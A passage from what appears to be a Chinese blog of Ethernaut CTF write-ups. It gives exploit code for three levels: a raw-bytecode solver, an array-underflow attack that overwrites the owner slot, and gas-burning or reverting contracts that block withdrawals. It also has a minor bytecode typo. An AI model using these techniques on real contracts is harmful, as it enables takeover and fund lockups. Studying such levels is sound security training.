______/\\\/\/\\\______________/\\\/___             ____/\\\/__\/\\\___________/\\\//_____             __/\\\\\\\\\\\\\\\\_____/\\\//________             _\///////////\\\//____/\\\/___________             ___________\/\\\_____/\\\\\\\\\\\\\\\_             ___________\///_____\///////////////__    */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">题目的意思就是部署一个合约 Solver ，要求在被调用 whatIsTheMeaningOfLife() 函数时返回 42 就可以了，但有一个限制是不能超过 10 个 opcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="合约创建"><a class="markdownIt-Anchor" href="#合约创建"></a> 合约创建</h4><p><a href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium</a></p><ol><li><p>首先，用户或合约想以太坊发送交易。包括数据但没有接受人的地址（没有 <code>to</code> 地址）。此格式向 EVM 指示是 ，而不是常规发送/调用事务。<code>contract creation</code></p></li><li><p>然后,EVM将solidity中的代码翻译为字节码，可直接转为操作码，在单个调用栈堆中执行。需要注意的重要一点：字节码包含 1） 和 2） 合约的实际值，按顺序连接。<code>contract creation</code>：<code>initialization code``runtime code</code></p></li><li><p>在congtract creation期间，EVM仅仅执行initialzation code，知道到达栈堆中第一条stop或start令，在此期间，合约的contructor会执行，合约就有地址了。在运行 <code>initialization code</code> 后，只有 <code>runtime code</code> 在堆栈上，然后将这些 <strong>opcode</strong> <strong>拷贝</strong> 到 <code>memory</code> 并返回到 <code>EVM</code></p></li><li><p>最后，EVM将runtime code返回的opcode存储在state storage，并于新地址相关联，合约被调用时，这些runtime code将会执行。</p></li></ol><h4 id="analyse-5"><a class="markdownIt-Anchor" href="#analyse-5"></a> Analyse</h4><ul><li><p>所以为了解决该题，我们需要</p><pre class="line-numbers language-none"><code class="language-none">initialization opcodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">runtime codes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>initialization opcodes</code>: 由 <code>EVM</code> 运行创建合约并存储将来要用的 <code>runtime codes</code></li><li><code>runtime codes</code>: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 <strong>return 42</strong> 并且 <strong>under 10 opcodes</strong></li></ul></li></ul><h5 id="runtime-codes"><a class="markdownIt-Anchor" href="#runtime-codes"></a> runtime codes :</h5><p>返回值由 return(p,s)，在此之前，使用mstore（p，v）储存在内存中</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token number">0x602a</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x2a</span>                  v<span class="token number">0x6080</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x80</span>                  p<span class="token number">0x52</span>       <span class="token punctuation">;</span>MSTORE  #将<span class="token number">0x2a</span>移动到<span class="token number">0x80</span>首先，使用 <span class="token function">mstore</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> v<span class="token punctuation">)</span> 将 <span class="token number">42</span> 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，<span class="token number">42</span> 的十六进制是 <span class="token number">0x2a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token number">0x6020</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x20</span>                  s<span class="token number">0x6080</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x80</span>                  p<span class="token number">0xf3</span>       <span class="token punctuation">;</span>RETURN使用 <span class="token keyword">return</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> s<span class="token punctuation">)</span> 返回 <span class="token number">0x2a</span> ，其中 p 是值 <span class="token number">0x2a</span> 存储的位置，s 是值 <span class="token number">0x2a</span> 存储所占的大小 <span class="token number">0x20</span> ，占<span class="token number">32</span>字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>runtime codes ：302a60805260206080f3 正好10 opcodes</p><h5 id="initialization-codes"><a class="markdownIt-Anchor" href="#initialization-codes"></a> initialization codes</h5><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token punctuation">;</span>copy bytecode to <span class="token keyword">memory</span><span class="token number">0x600a</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x0a</span>                      <span class="token function">S</span><span class="token punctuation">(</span>runtime code size<span class="token punctuation">)</span><span class="token number">0x60</span><span class="token operator">?</span><span class="token operator">?</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0</span>x<span class="token operator">?</span><span class="token operator">?</span>                      <span class="token function">F</span><span class="token punctuation">(</span>current position of runtime opcodes<span class="token punctuation">)</span><span class="token number">0x6000</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x00</span>                      <span class="token function">T</span><span class="token punctuation">(</span>destination <span class="token keyword">memory</span> index <span class="token number">0</span><span class="token punctuation">)</span><span class="token number">0x39</span>       <span class="token punctuation">;</span>CODECOPY首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 <span class="token function">codecopy</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> f<span class="token punctuation">,</span> s<span class="token punctuation">)</span> 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 <span class="token number">602</span>a60805260206080f3 就是 <span class="token number">10</span> <span class="token builtin">bytes</span>第一步PUSH1 <span class="token number">0x0a</span>对应的是length变量，因为我们上面构造的opcode序列长度为<span class="token number">10</span>。第二步PUSH1 <span class="token number">0x0c</span>是因为，初始化代码的长度为<span class="token number">0xB</span>，也就是运行时代码的字节码是从<span class="token number">0xc</span>偏移开始的，因此offset为<span class="token number">0xc</span>。第三步PUSH1 <span class="token number">0</span>是指定将我们的代码复制到<span class="token keyword">memory</span>的slot <span class="token number">0</span>处。前<span class="token number">4</span>条指令，完成了将<span class="token number">0xC</span>到<span class="token number">0x16</span>这<span class="token number">10</span>个字节复制到<span class="token keyword">memory</span>的<span class="token number">0x00</span>到<span class="token number">0xA</span>位置处的任务（，<span class="token number">60</span> <span class="token number">0</span>c指令确实起到了指定源代码起始偏移量的作用。正如您所指出的，前面的<span class="token number">6</span>个字节（<span class="token number">60</span> <span class="token number">0</span>a <span class="token number">60</span> <span class="token number">0</span>c <span class="token number">60</span> <span class="token number">00</span> <span class="token number">39</span>）是用来配置这次复制操作的指令，分别指定了复制的长度、源代码的起始偏移以及目标内存的起始位置。因此，从第<span class="token number">7</span>个字节（偏移量<span class="token number">0x0c</span>）开始的数据才是实际需要被复制的代码内容。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token punctuation">;</span><span class="token keyword">return</span> code <span class="token keyword">from</span> <span class="token keyword">memory</span> to EVM<span class="token number">0x600a</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x0a</span>                      S<span class="token number">0x6000</span>     <span class="token punctuation">;</span>PUSH1 <span class="token number">0x00</span>                      P<span class="token number">0xf3</span>       <span class="token punctuation">;</span>RETURN需要将内存中的 runtime codes 返回到 EVM<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>initialization codes</code> 总共占了 <strong>0x0c</strong> 字节，这表示 <code>runtime codes</code> 从索引 <strong>0x0c</strong> 开始，所以 <strong>??</strong> 的地方是 <strong>0x0c</strong></li><li>所以，<code>initialization codes</code> 最后的顺序是 <strong>600a600c600039600a6000f3</strong></li></ul><p>initialization codes：600a600c600039600a6000f3</p><h4 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h4><p>opcodes  ：<strong>0x600a600c600039600a6000f3602a60805260206080f3</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">var</span> bytecode <span class="token operator">=</span> <span class="token string">"0x600a600c600039600a6000f3602a60805260206080f3"</span><span class="token punctuation">;</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token keyword">from</span><span class="token punctuation">:</span> player<span class="token punctuation">,</span> data<span class="token punctuation">:</span> bytecode <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>#查看交易记录 得到 to：<span class="token number">0x820e93bfa60c20a9166e0955fd842d09f268b1ca</span>await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">setSolver</span><span class="token punctuation">(</span><span class="token string">'0x820e93bfa60c20a9166e0955fd842d09f268b1ca'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="alien-codex"><a class="markdownIt-Anchor" href="#alien-codex"></a> Alien Codex</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../helpers/Ownable-05.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AlienCodex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> contact<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">public</span> codex<span class="token punctuation">;</span>    <span class="token keyword">modifier</span> <span class="token function">contacted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span>contact<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">makeContact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        contact <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">record</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">retract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">.</span>length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">revise</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> i<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span>        codex<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><!-- You've uncovered an Alien contract. Claim ownership to complete the level.  Things that might helpUnderstanding how array storage worksUnderstanding ABI specificationsUsing a very underhanded approach --><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"../GSN/Context.sol"</span><span class="token punctuation">;</span><span class="token comment">/** * @dev Contract module which provides a basic access control mechanism, where * there is an account (an owner) that can be granted exclusive access to * specific functions. * * By default, the owner account will be the one that deploys the contract. This * can later be changed with &#123;transferOwnership&#125;. * * This module is used through inheritance. It will make available the modifier * `onlyOwner`, which can be applied to your functions to restrict their use to * the owner. */</span><span class="token keyword">contract</span> <span class="token class-name">Ownable</span> <span class="token keyword">is</span> Context <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> _owner<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> previousOwner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * @dev Initializes the contract setting the deployer as the initial owner.     */</span>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> msgSender <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _owner <span class="token operator">=</span> msgSender<span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgSender<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * @dev Returns the address of the current owner.     */</span>    <span class="token keyword">function</span> <span class="token function">owner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * @dev Throws if called by any account other than the owner.     */</span>    <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>_owner <span class="token operator">==</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Ownable: caller is not the owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * @dev Leaves the contract without owner. It will not be possible to call     * `onlyOwner` functions anymore. Can only be called by the current owner.     *     * NOTE: Renouncing ownership will leave the contract without an owner,     * thereby removing any functionality that is only available to the owner.     */</span>    <span class="token keyword">function</span> <span class="token function">renounceOwnership</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> virtual onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span>_owner<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _owner <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     * Can only be called by the current owner.     */</span>    <span class="token keyword">function</span> <span class="token function">transferOwnership</span><span class="token punctuation">(</span><span class="token builtin">address</span> newOwner<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual onlyOwner <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>newOwner <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Ownable: new owner is the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span>_owner<span class="token punctuation">,</span> newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span>        _owner <span class="token operator">=</span> newOwner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="analyse-6"><a class="markdownIt-Anchor" href="#analyse-6"></a> Analyse</h4><p>要求获得owner的权限，合约继承自Owenable合约，其中有 _owenr状态变量，则可以推出存储布局</p><pre class="line-numbers language-none"><code class="language-none">-------------------------------|   contact(1)| _owner(20)    | &lt;- slot 0-------------------------------|       codex.length(32)      | &lt;- slot 1-------------------------------|          codex[0]           | &lt;- slot keccak256(1)-------------------------------|           ...               | &lt;- slot ...-------------------------------| codex[2^256-1-keccak256(1)] | &lt;- slot max-------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出codex长度没有设置，可以通过retract函数可以使数组长度溢出，然后可以通过revise方法进行数组赋值。所以，本题可以codex数组溢出到slot0来修改owner的存储。<br>x=keccak256(bytes32(1))) ，那么当我们修改 codex[y],(y=2^256-x+0) 时就能修改 slot 0 ，从而修改 owner。<br>但是由于函数修改器的存在，我们需要使用makeContact()函数来解除限制。</p><h4 id="attack-5"><a class="markdownIt-Anchor" href="#attack-5"></a> Attack</h4><p>第一步我们先解除限制</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">makeContact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用retract实现数组溢出</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">retract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于数组长度没有定义，所以为0，只要调用retract()函数，就会溢出，然后调用revise()函数修改数组长度，从而修改owner。<br>然后只需修改codex[2^256 - keccak256(1)]的值就可以改变owner。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">codex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>y = 2^256 - keccak256(1)=0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a<br>然后调用revise函数，第二个参数必须补全32位。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">revise</span><span class="token punctuation">(</span>    <span class="token string">"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a"</span><span class="token punctuation">,</span>    <span class="token string">"0x000000000000000000000000D15e151C53bfbDcaf21f5FC849167c526c5A4572"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后就可以通关了。</p><h3 id="denial"><a class="markdownIt-Anchor" href="#denial"></a> Denial</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Denial</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> partner<span class="token punctuation">;</span> <span class="token comment">// withdrawal partner - pay the gas, split the withdraw</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> owner <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xA9E</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> timeLastWithdrawn<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> withdrawPartnerBalances<span class="token punctuation">;</span> <span class="token comment">// keep track of partners balances</span>    <span class="token keyword">function</span> <span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _partner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        partner <span class="token operator">=</span> _partner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// withdraw 1% to recipient and 1% to owner</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">uint256</span> amountToSend <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token comment">// perform a call without checking return</span>        <span class="token comment">// The recipient can revert, the owner will still get their share</span>        partner<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amountToSend<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>amountToSend<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// keep track of last withdrawal time</span>        timeLastWithdrawn <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>        withdrawPartnerBalances<span class="token punctuation">[</span>partner<span class="token punctuation">]</span> <span class="token operator">+=</span> amountToSend<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// allow deposit of funds</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token comment">// convenience function</span>    <span class="token keyword">function</span> <span class="token function">contractBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。<br>通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M<br>要求阻止提取资金。</p><p>transfer与send相似，都为转账操作<br>transfer出错抛出异常<br>send、call出错不抛出异常，返回true或false<br>tansfer相对send更安全<br>send、call即便转账失败也会执行其后的代码<br>慎用call函数转账，容易发生重入攻击。</p><h4 id="analyse-7"><a class="markdownIt-Anchor" href="#analyse-7"></a> Analyse</h4><p>本题会通过call以及transfer函数来进行转账。每当用户提款时，会调用withdraw函数，取出1%发给partner，还有1%发给owner.<br>本题代码漏洞在于call函数没有检查返回值和指定gas。所以如果在调用call函数时消耗了所有的gas，那么call函数就会 触发 out of gas错误，而之后的transfer函数也会因为gas不足而导致失败。<br>这里有两种思路，一种是通过循环不断消耗gas，另外一种是通过assert来做条件检查</p><p>assert 抛出panic错误时会终止执行。</p><h4 id="attack-6"><a class="markdownIt-Anchor" href="#attack-6"></a> Attack</h4><h5 id="第一种"><a class="markdownIt-Anchor" href="#第一种"></a> 第一种</h5><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> target<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span>        target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setWithdrawPartner(address)"</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="第二种"><a class="markdownIt-Anchor" href="#第二种"></a> 第二种</h5><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">DenialAttack</span> <span class="token punctuation">&#123;</span>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行await contract.setWithdrawPartner(“0x03e1a1cf7fc319822355dce72c50b368094546ef”)</p><h3 